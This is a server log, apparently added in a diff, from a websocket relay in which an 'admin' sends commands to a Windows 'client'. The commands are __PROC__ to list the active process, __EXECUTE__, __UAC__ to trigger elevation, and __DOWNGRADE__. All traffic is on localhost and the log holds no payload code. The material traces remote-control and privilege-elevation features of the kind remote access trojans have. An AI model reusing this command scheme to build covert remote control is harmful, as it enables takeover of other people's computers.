+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] No command from Admin, resetting connection...
+[2026-01-20 17:14:10] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 17:14:10] [WARN] Failed to send data: 'NoneType' object has no attribute 'sendall'
+[2026-01-20 17:14:10] [WARN] Admin disconnected or error: 'NoneType' object has no attribute 'close'
+[2026-01-20 17:14:10] Client disconnected: ('127.0.0.1', 36870)
+[2026-01-20 17:23:32] Connected: ('127.0.0.1', 60840)
+[2026-01-20 17:23:33] ('127.0.0.1', 60840) is admin
+[2026-01-20 17:23:35] waiting for admin commands...
+[2026-01-20 17:23:35] Command from Admin: __PROC__
+[2026-01-20 17:23:35] Waiting for client Reply...
+[2026-01-20 17:23:35] No Client connected.
+[2026-01-20 17:23:35] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 17:23:35] iterated admin loop
+[2026-01-20 17:23:36] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 17:23:36] waiting for admin commands...
+[2026-01-20 17:23:38] Command from Admin: __PROC__
+[2026-01-20 17:23:38] Waiting for client Reply...
+[2026-01-20 17:23:38] No Client connected.
+[2026-01-20 17:23:38] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 17:23:38] iterated admin loop
+[2026-01-20 17:23:38] Connected: ('127.0.0.1', 60842)
+[2026-01-20 17:23:38] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 17:23:38] waiting for admin commands...
+[2026-01-20 17:23:38] Set Client to: ('127.0.0.1', 60842)
+[2026-01-20 17:23:39] Command from Admin: __PROC__
+[2026-01-20 17:23:39] Waiting for client Reply...
+[2026-01-20 17:23:39] No Client connected.
+[2026-01-20 17:23:39] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 17:23:39] iterated admin loop
+[2026-01-20 17:23:39] waiting for admin commands...
+[2026-01-20 17:23:40] Command from Admin: __PROC__
+[2026-01-20 17:23:40] Waiting for client Reply...
+[2026-01-20 17:23:40] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 17:23:40] Reply from Client: WindowsTerminal.exe
+[2026-01-20 17:23:40] [send_ws] sending 21 bytes: 81 13 57 69 6E 64 6F 77 73 54 65 72 6D 69 6E 61 6C 2E 65 78 65  ascii='�\x13WindowsTerminal.exe'
+[2026-01-20 17:23:40] iterated admin loop
+[2026-01-20 17:23:40] waiting for admin commands...
+[2026-01-20 17:23:55] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 17:23:55] Waiting for client Reply...
+[2026-01-20 17:23:55] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 17:23:55] No reply from Client.
+[2026-01-20 17:23:55] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 17:23:55] iterated admin loop
+[2026-01-20 17:23:55] waiting for admin commands...
+[2026-01-20 17:23:55] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 17:23:55] Waiting for client Reply...
+[2026-01-20 17:23:55] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 17:23:55] No reply from Client.
+[2026-01-20 17:23:55] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 17:23:55] iterated admin loop
+[2026-01-20 17:23:55] waiting for admin commands...
+[2026-01-20 17:23:56] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 17:23:56] Waiting for client Reply...
+[2026-01-20 17:23:56] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 17:23:56] [WARN] Admin disconnected or error: [Errno 32] Broken pipe
+[2026-01-20 17:23:56] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 17:23:56] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 17:23:56] Client disconnected: ('127.0.0.1', 60840)
+[2026-01-20 17:23:56] Client disconnected: ('127.0.0.1', 60842)
+[2026-01-20 17:24:24] Connected: ('127.0.0.1', 39318)
+[2026-01-20 17:24:25] ('127.0.0.1', 39318) is admin
+[2026-01-20 17:24:26] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 17:24:26] waiting for admin commands...
+[2026-01-20 17:24:27] Command from Admin: __PROC__
+[2026-01-20 17:24:27] Waiting for client Reply...
+[2026-01-20 17:24:27] No Client connected.
+[2026-01-20 17:24:27] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 17:24:27] iterated admin loop
+[2026-01-20 17:24:28] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 17:24:28] waiting for admin commands...
+[2026-01-20 17:24:29] Connected: ('127.0.0.1', 45846)
+[2026-01-20 17:24:29] Command from Admin: __PROC__
+[2026-01-20 17:24:29] Waiting for client Reply...
+[2026-01-20 17:24:29] No Client connected.
+[2026-01-20 17:24:29] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 17:24:29] iterated admin loop
+[2026-01-20 17:24:29] Set Client to: ('127.0.0.1', 45846)
+[2026-01-20 17:24:30] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 17:24:30] waiting for admin commands...
+[2026-01-20 17:24:31] Command from Admin: __PROC__
+[2026-01-20 17:24:31] Waiting for client Reply...
+[2026-01-20 17:24:31] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 17:24:31] Reply from Client: WindowsTerminal.exe
+[2026-01-20 17:24:31] [send_ws] sending 21 bytes: 81 13 57 69 6E 64 6F 77 73 54 65 72 6D 69 6E 61 6C 2E 65 78 65  ascii='�\x13WindowsTerminal.exe'
+[2026-01-20 17:24:31] iterated admin loop
+[2026-01-20 17:24:31] waiting for admin commands...
+[2026-01-20 17:24:51] iterated admin loop
+[2026-01-20 17:24:51] waiting for admin commands...
+[2026-01-20 17:25:11] iterated admin loop
+[2026-01-20 17:25:11] waiting for admin commands...
+[2026-01-20 17:25:31] iterated admin loop
+[2026-01-20 17:25:31] waiting for admin commands...
+[2026-01-20 17:25:51] iterated admin loop
+[2026-01-20 17:25:51] waiting for admin commands...
+[2026-01-20 17:26:11] iterated admin loop
+[2026-01-20 17:26:11] waiting for admin commands...
+[2026-01-20 17:26:29] Command from Admin: __UAC__ ### elevate
+[2026-01-20 17:26:29] Waiting for client Reply...
+[2026-01-20 17:26:29] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 17:26:58] Reply from Client: Started elevation via UAC
+[2026-01-20 17:26:58] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 17:26:58] iterated admin loop
+[2026-01-20 17:26:58] waiting for admin commands...
+[2026-01-20 17:27:18] iterated admin loop
+[2026-01-20 17:27:18] waiting for admin commands...
+[2026-01-20 17:27:38] iterated admin loop
+[2026-01-20 17:27:38] waiting for admin commands...
+[2026-01-20 17:27:58] iterated admin loop
+[2026-01-20 17:27:58] waiting for admin commands...
+[2026-01-20 17:28:18] iterated admin loop
+[2026-01-20 17:28:18] waiting for admin commands...
+[2026-01-20 17:28:38] iterated admin loop
+[2026-01-20 17:28:38] waiting for admin commands...
+[2026-01-20 17:28:58] iterated admin loop
+[2026-01-20 17:28:58] waiting for admin commands...
+[2026-01-20 17:29:18] iterated admin loop
+[2026-01-20 17:29:18] waiting for admin commands...
+[2026-01-20 17:29:38] iterated admin loop
+[2026-01-20 17:29:38] waiting for admin commands...
+[2026-01-20 17:29:58] iterated admin loop
+[2026-01-20 17:29:58] waiting for admin commands...
+[2026-01-20 17:30:18] iterated admin loop
+[2026-01-20 17:30:18] waiting for admin commands...
+[2026-01-20 17:30:38] iterated admin loop
+[2026-01-20 17:30:38] waiting for admin commands...
+[2026-01-20 17:30:58] iterated admin loop
+[2026-01-20 17:30:58] waiting for admin commands...
+[2026-01-20 17:31:18] iterated admin loop
+[2026-01-20 17:31:18] waiting for admin commands...
+[2026-01-20 17:31:38] iterated admin loop
+[2026-01-20 17:31:38] waiting for admin commands...
+[2026-01-20 17:31:58] iterated admin loop
+[2026-01-20 17:31:58] waiting for admin commands...
+[2026-01-20 17:32:18] iterated admin loop
+[2026-01-20 17:32:18] waiting for admin commands...
+[2026-01-20 17:32:38] iterated admin loop
+[2026-01-20 17:32:38] waiting for admin commands...
+[2026-01-20 17:32:58] iterated admin loop
+[2026-01-20 17:32:58] waiting for admin commands...
+[2026-01-20 17:33:18] iterated admin loop
+[2026-01-20 17:33:18] waiting for admin commands...
+[2026-01-20 17:33:38] No command from Admin, resetting connection...
+[2026-01-20 17:33:38] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 17:33:38] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 17:33:38] iterated admin loop
+[2026-01-20 17:33:38] Client disconnected: ('127.0.0.1', 39318)
+[2026-01-20 17:33:39] Client disconnected: ('127.0.0.1', 45846)
+[2026-01-20 18:33:21] Connected: ('127.0.0.1', 36602)
+[2026-01-20 18:33:21] ('127.0.0.1', 36602) is admin
+[2026-01-20 18:33:23] waiting for admin commands...
+[2026-01-20 18:33:27] Command from Admin: __PROC__
+[2026-01-20 18:33:27] Waiting for client Reply...
+[2026-01-20 18:33:27] No Client connected.
+[2026-01-20 18:33:27] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 18:33:27] iterated admin loop
+[2026-01-20 18:33:27] Connected: ('127.0.0.1', 36616)
+[2026-01-20 18:33:27] Set Client to: ('127.0.0.1', 36616)
+[2026-01-20 18:33:28] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 18:33:28] waiting for admin commands...
+[2026-01-20 18:33:29] Command from Admin: __PROC__
+[2026-01-20 18:33:29] Waiting for client Reply...
+[2026-01-20 18:33:29] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 18:33:29] Reply from Client: WindowsTerminal.exe
+[2026-01-20 18:33:29] [send_ws] sending 21 bytes: 81 13 57 69 6E 64 6F 77 73 54 65 72 6D 69 6E 61 6C 2E 65 78 65  ascii='�\x13WindowsTerminal.exe'
+[2026-01-20 18:33:29] iterated admin loop
+[2026-01-20 18:33:29] waiting for admin commands...
+[2026-01-20 18:33:30] Command from Admin: __PROC__
+[2026-01-20 18:33:30] Waiting for client Reply...
+[2026-01-20 18:33:30] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 18:33:30] Reply from Client: WindowsTerminal.exe
+[2026-01-20 18:33:30] [send_ws] sending 21 bytes: 81 13 57 69 6E 64 6F 77 73 54 65 72 6D 69 6E 61 6C 2E 65 78 65  ascii='�\x13WindowsTerminal.exe'
+[2026-01-20 18:33:30] iterated admin loop
+[2026-01-20 18:33:30] waiting for admin commands...
+[2026-01-20 18:33:38] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 18:33:38] Waiting for client Reply...
+[2026-01-20 18:33:38] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 18:33:38] No reply from Client.
+[2026-01-20 18:33:38] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 18:33:38] iterated admin loop
+[2026-01-20 18:33:38] waiting for admin commands...
+[2026-01-20 18:33:39] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 18:33:39] Waiting for client Reply...
+[2026-01-20 18:33:39] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 18:33:39] No reply from Client.
+[2026-01-20 18:33:39] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 18:33:39] iterated admin loop
+[2026-01-20 18:33:39] waiting for admin commands...
+[2026-01-20 18:33:39] Command from Admin: __EXECUTE__ ### 
+[2026-01-20 18:33:39] Waiting for client Reply...
+[2026-01-20 18:33:39] [send_ws] sending 18 bytes: 81 10 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20  ascii='�\x10__EXECUTE__ ### '
+[2026-01-20 18:33:39] [WARN] Admin disconnected or error: [Errno 32] Broken pipe
+[2026-01-20 18:33:39] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 18:33:39] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 18:33:39] Client disconnected: ('127.0.0.1', 36602)
+[2026-01-20 18:33:39] Client disconnected: ('127.0.0.1', 36616)
+[2026-01-20 18:34:39] Connected: ('127.0.0.1', 50136)
+[2026-01-20 18:34:39] ('127.0.0.1', 50136) is admin
+[2026-01-20 18:34:40] Connected: ('127.0.0.1', 50150)
+[2026-01-20 18:34:40] Set Client to: ('127.0.0.1', 50150)
+[2026-01-20 18:34:41] waiting for admin commands...
+[2026-01-20 18:34:41] Command from Admin: __PROC__
+[2026-01-20 18:34:41] Waiting for client Reply...
+[2026-01-20 18:34:41] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 18:34:41] Reply from Client: WindowsTerminal.exe, not elevated
+[2026-01-20 18:34:41] [send_ws] sending 35 bytes: 81 21 57 69 6E 64 6F 77 73 54 65 72 6D 69 6E 61 6C 2E 65 78 65 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�!WindowsTerminal.exe, not elevated'
+[2026-01-20 18:34:41] iterated admin loop
+[2026-01-20 18:34:41] waiting for admin commands...
+[2026-01-20 18:34:43] Command from Admin: __PROC__
+[2026-01-20 18:34:43] Waiting for client Reply...
+[2026-01-20 18:34:43] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 18:34:43] Reply from Client: WindowsTerminal.exe, not elevated
+[2026-01-20 18:34:43] [send_ws] sending 35 bytes: 81 21 57 69 6E 64 6F 77 73 54 65 72 6D 69 6E 61 6C 2E 65 78 65 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�!WindowsTerminal.exe, not elevated'
+[2026-01-20 18:34:43] iterated admin loop
+[2026-01-20 18:34:43] waiting for admin commands...
+[2026-01-20 18:34:57] Command from Admin: __DOWNGRADE__
+[2026-01-20 18:34:57] Waiting for client Reply...
+[2026-01-20 18:34:57] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 18:36:54] No reply from Client.
+[2026-01-20 18:36:54] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 18:36:54] iterated admin loop
+[2026-01-20 18:36:54] waiting for admin commands...
+[2026-01-20 18:36:54] admin socket dead.
+[2026-01-20 18:36:54] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 18:36:54] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 18:36:54] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 18:36:54] iterated admin loop
+[2026-01-20 18:36:54] Client disconnected: ('127.0.0.1', 50136)
+[2026-01-20 18:36:54] Client disconnected: ('127.0.0.1', 50150)
+[2026-01-20 19:14:48] Connected: ('127.0.0.1', 41788)
+[2026-01-20 19:14:49] ('127.0.0.1', 41788) is admin
+[2026-01-20 19:14:50] Connected: ('127.0.0.1', 35104)
+[2026-01-20 19:14:50] Set Client to: ('127.0.0.1', 35104)
+[2026-01-20 19:14:51] waiting for admin commands...
+[2026-01-20 19:14:55] Command from Admin: __PROC__
+[2026-01-20 19:14:55] Waiting for client Reply...
+[2026-01-20 19:14:55] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:14:55] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:14:55] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:14:55] iterated admin loop
+[2026-01-20 19:14:55] waiting for admin commands...
+[2026-01-20 19:15:00] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:15:00] Waiting for client Reply...
+[2026-01-20 19:15:00] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:15:09] Reply from Client: Started elevation via UAC
+[2026-01-20 19:15:09] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 19:15:09] iterated admin loop
+[2026-01-20 19:15:09] waiting for admin commands...
+[2026-01-20 19:15:13] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:15:13] Waiting for client Reply...
+[2026-01-20 19:15:13] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:15:44] No reply from Client.
+[2026-01-20 19:15:44] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 19:15:44] iterated admin loop
+[2026-01-20 19:15:44] waiting for admin commands...
+[2026-01-20 19:15:44] admin socket dead.
+[2026-01-20 19:15:44] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:15:44] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 19:15:44] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 19:15:44] iterated admin loop
+[2026-01-20 19:15:44] Client disconnected: ('127.0.0.1', 41788)
+[2026-01-20 19:15:44] Client disconnected: ('127.0.0.1', 35104)
+[2026-01-20 19:16:12] Connected: ('127.0.0.1', 33928)
+[2026-01-20 19:16:12] ('127.0.0.1', 33928) is admin
+[2026-01-20 19:16:14] waiting for admin commands...
+[2026-01-20 19:16:16] Connected: ('127.0.0.1', 33944)
+[2026-01-20 19:16:16] Set Client to: ('127.0.0.1', 33944)
+[2026-01-20 19:16:17] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:16:17] Waiting for client Reply...
+[2026-01-20 19:16:17] No Client connected.
+[2026-01-20 19:16:17] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 19:16:17] iterated admin loop
+[2026-01-20 19:16:17] waiting for admin commands...
+[2026-01-20 19:16:19] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:16:19] Waiting for client Reply...
+[2026-01-20 19:16:19] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:16:21] Reply from Client: Started elevation via UAC
+[2026-01-20 19:16:21] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 19:16:21] iterated admin loop
+[2026-01-20 19:16:21] waiting for admin commands...
+[2026-01-20 19:16:41] iterated admin loop
+[2026-01-20 19:16:41] waiting for admin commands...
+[2026-01-20 19:17:01] iterated admin loop
+[2026-01-20 19:17:01] waiting for admin commands...
+[2026-01-20 19:17:21] iterated admin loop
+[2026-01-20 19:17:21] waiting for admin commands...
+[2026-01-20 19:17:41] iterated admin loop
+[2026-01-20 19:17:41] waiting for admin commands...
+[2026-01-20 19:18:01] iterated admin loop
+[2026-01-20 19:18:01] waiting for admin commands...
+[2026-01-20 19:18:21] iterated admin loop
+[2026-01-20 19:18:21] waiting for admin commands...
+[2026-01-20 19:18:41] iterated admin loop
+[2026-01-20 19:18:41] waiting for admin commands...
+[2026-01-20 19:19:01] iterated admin loop
+[2026-01-20 19:19:01] waiting for admin commands...
+[2026-01-20 19:19:21] iterated admin loop
+[2026-01-20 19:19:21] waiting for admin commands...
+[2026-01-20 19:19:41] iterated admin loop
+[2026-01-20 19:19:41] waiting for admin commands...
+[2026-01-20 19:20:01] iterated admin loop
+[2026-01-20 19:20:01] waiting for admin commands...
+[2026-01-20 19:20:17] Command from Admin: __DOWNGRADE__
+[2026-01-20 19:20:17] Waiting for client Reply...
+[2026-01-20 19:20:17] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 19:20:53] Connected: ('127.0.0.1', 59390)
+[2026-01-20 19:20:54] ('127.0.0.1', 59390) is admin
+[2026-01-20 19:20:54] waiting for admin commands...
+[2026-01-20 19:20:56] Command from Admin: __PROC__
+[2026-01-20 19:20:56] Waiting for client Reply...
+[2026-01-20 19:20:56] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:20:57] Connected: ('127.0.0.1', 59394)
+[2026-01-20 19:20:58] Set Client to: ('127.0.0.1', 59394)
+[2026-01-20 19:20:58] Client disconnected: ('127.0.0.1', 33944)
+[2026-01-20 19:21:08] Connected: ('127.0.0.1', 45042)
+[2026-01-20 19:21:08] ('127.0.0.1', 45042) is admin
+[2026-01-20 19:21:08] waiting for admin commands...
+[2026-01-20 19:21:09] Command from Admin: __PROC__
+[2026-01-20 19:21:09] Waiting for client Reply...
+[2026-01-20 19:21:09] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 19:21:10] Reply from Client: Explorer.EXE, not elevated
+[2026-01-20 19:21:10] [send_ws] sending 28 bytes: 81 1A 45 78 70 6C 6F 72 65 72 2E 45 58 45 2C 20 6E 6F 74 20 65 6C 65 76 61 74 65 64  ascii='�\x1aExplorer.EXE, not elevated'
+[2026-01-20 19:21:10] iterated admin loop
+[2026-01-20 19:21:10] waiting for admin commands...
+[2026-01-20 19:21:17] Command from Admin: __UAC__ ### elevate
+[2026-01-20 19:21:17] Waiting for client Reply...
+[2026-01-20 19:21:17] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 19:21:19] Reply from Client: Started elevation via UAC
+[2026-01-20 19:21:19] [send_ws] sending 27 bytes: 81 19 53 74 61 72 74 65 64 20 65 6C 65 76 61 74 69 6F 6E 20 76 69 61 20 55 41 43  ascii='�\x19Started elevation via UAC'
+[2026-01-20 19:21:19] iterated admin loop
+[2026-01-20 19:21:19] waiting for admin commands...
+[2026-01-20 19:21:39] iterated admin loop
+[2026-01-20 19:21:39] waiting for admin commands...
+[2026-01-20 19:21:59] iterated admin loop
